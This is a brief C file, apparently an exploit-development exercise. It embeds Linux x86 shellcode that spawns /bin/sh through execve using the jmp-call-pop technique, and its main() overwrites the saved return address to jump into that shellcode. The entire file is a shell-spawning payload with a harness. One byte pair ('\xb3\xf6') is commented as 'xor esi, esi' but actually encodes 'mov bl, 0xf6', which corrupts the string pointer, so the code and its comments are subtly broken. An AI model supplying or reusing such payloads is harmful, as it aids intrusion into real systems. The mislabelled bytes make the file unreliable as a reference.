char shellcode[] = "\xeb\x0d" 	// jmp DATA
		  
                                // PAYLOAD:
	           "\x5b"   	// pop ebx
		   "\x31\xc9" 	// xor ecx, ecx
		   "\x31\xc0"	// xor eax, eax
		   "\x31\xd2"   // xor edx, edx
		   "\xb3\xf6" 	// xor esi, esi
		   
		   "\xb0\x0b" 	// mov al, 0xb
		   "\xcd\x80" 	// int 80h

		   				  // DATA:
		   "\xe8\xee\xff\xff\xff" 	  // call PAYLOAD
		   "\x2f\x62\x69\x6e\x2f\x73\x68" // /bin/sh
		   "\x00";

int main()
{
	int* ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}
